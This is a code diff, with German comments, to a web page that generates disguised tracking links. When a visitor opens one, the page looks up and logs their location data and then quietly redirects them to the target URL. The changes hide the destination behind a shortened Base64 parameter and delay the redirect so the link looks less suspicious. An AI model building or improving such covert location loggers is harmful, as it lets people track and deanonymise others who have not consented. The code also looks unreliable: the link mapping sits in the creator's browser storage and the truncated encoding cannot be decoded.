@@ -233,21 +233,17 @@
             }
 
             try {
-                const urlObj = new URL(url);
-                const trackingId = Math.random().toString(36).substr(2, 6);
+                const trackingId = Math.random().toString(36).substr(2, 8);
                 
                 // Speichere die Zuordnung
                 trackingData[trackingId] = url;
                 localStorage.setItem('trackingData', JSON.stringify(trackingData));
                 localStorage.setItem('userDomain', domain);
 
-                // Extrahiere Domain-Name und Pfad aus der Ziel-URL
-                const targetHost = urlObj.hostname.replace('www.', '');
-                const targetPath = urlObj.pathname !== '/' ? urlObj.pathname : '';
-                
-                // Erstelle einen unauffälligen Link
+                // Erstelle einen unauffälligen Link mit URL als Parameter
                 const cleanDomain = domain.replace(/\/$/, '');
-                const trackedUrl = `${cleanDomain}/${targetHost}${targetPath}?ref=${trackingId}`;
+                const encodedUrl = btoa(url).replace(/=/g, '').substr(0, 12); // Base64 verkürzt
+                const trackedUrl = `${cleanDomain}?s=${encodedUrl}&ref=${trackingId}`;
                 
                 document.getElementById('trackedLink').textContent = trackedUrl;
                 document.getElementById('result').classList.add('show');
@@ -317,40 +313,27 @@
 
         // Prüfe ob Tracking-Parameter vorhanden ist
         async function checkTracking() {
-            const path = window.location.pathname;
             const params = new URLSearchParams(window.location.search);
             const trackingId = params.get('ref');
+            const shortUrl = params.get('s');
 
-            // Wenn wir einen Pfad haben (z.B. /youtube.com/watch)
-            if (path && path !== '/' && path !== '/index.html') {
-                if (trackingId) {
-                    const savedData = JSON.parse(localStorage.getItem('trackingData') || '{}');
-                    const targetUrl = savedData[trackingId];
+            if (trackingId) {
+                const savedData = JSON.parse(localStorage.getItem('trackingData') || '{}');
+                const targetUrl = savedData[trackingId];
 
-                    if (targetUrl) {
-                        const locationData = await getLocationData();
-                        
-                        logs.push({
-                            ...locationData,
-                            targetUrl: targetUrl
-                        });
-                        saveLogs();
+                if (targetUrl) {
+                    const locationData = await getLocationData();
+                    
+                    logs.push({
+                        ...locationData,
+                        targetUrl: targetUrl
+                    });
+                    saveLogs();
 
-                        // Weiterleitung zur Ziel-URL
+                    // Weiterleitung zur Ziel-URL
+                    setTimeout(() => {
                         window.location.href = targetUrl;
-                    } else {
-                        // Versuche die URL aus dem Pfad zu rekonstruieren
-                        const reconstructedUrl = 'https:/' + path;
-                        const locationData = await getLocationData();
-                        
-                        logs.push({
-                            ...locationData,
-                            targetUrl: reconstructedUrl
-                        });
-                        saveLogs();
-
-                        window.location.href = reconstructedUrl;
-                    }
+                    }, 100);
                 }
             }
         }
